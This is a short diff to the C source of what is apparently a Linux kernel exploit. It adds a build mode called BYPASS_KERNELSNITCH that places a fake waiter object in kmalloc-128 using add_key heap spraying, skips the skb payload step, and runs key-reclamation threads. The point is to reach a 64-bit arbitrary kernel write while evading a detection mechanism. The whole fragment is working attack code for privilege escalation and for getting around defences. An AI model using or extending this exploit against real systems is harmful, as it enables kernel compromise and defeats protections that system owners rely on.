@@ -68,6 +68,14 @@ static int direct_pselect_write_once_internal(
     uintptr_t heap_w0 = fake_w0;
     uintptr_t heap_task = fake_task;
 
+#ifdef BYPASS_KERNELSNITCH
+    // In BYPASS_KERNELSNITCH mode, keys are sprayed in prepare_good_kernel_page
+    // The fake waiter is in kmalloc-128 via add_key, NOT in pselect fd_set
+    // Skip prepare_skb_payload entirely - it overwrites our values
+    pr_success("direct-w64[%d] target=%016zx value=%016zx shape=%d "
+               "workspace=%016zx (add_key mode)\n",
+               idx, target, value, shape, page_base);
+#else
     /* Refresh the custom waiter/task layout without sending another skb. */
     if (!prepare_skb_payload(page_base, PAGE_PAYLOAD_FOPS) ||
         page_base != heap_page || fake_lock != heap_lock ||
@@ -78,7 +86,15 @@ static int direct_pselect_write_once_internal(
     pr_success("direct-w64[%d] target=%016zx value=%016zx shape=%d "
                "workspace=%016zx\n",
                idx, target, value, shape, page_base);
+#endif
+    
+#ifdef BYPASS_KERNELSNITCH
+    // Use key reclamation version - no pselect
+    extern void run_main_route_threads_keys(void);
+    run_main_route_threads_keys();
+#else
     run_main_route_threads();
+#endif
 
     int triggered = atomic_load(&route_done) &&
                     atomic_load(&consumer_calls) > 0 &&
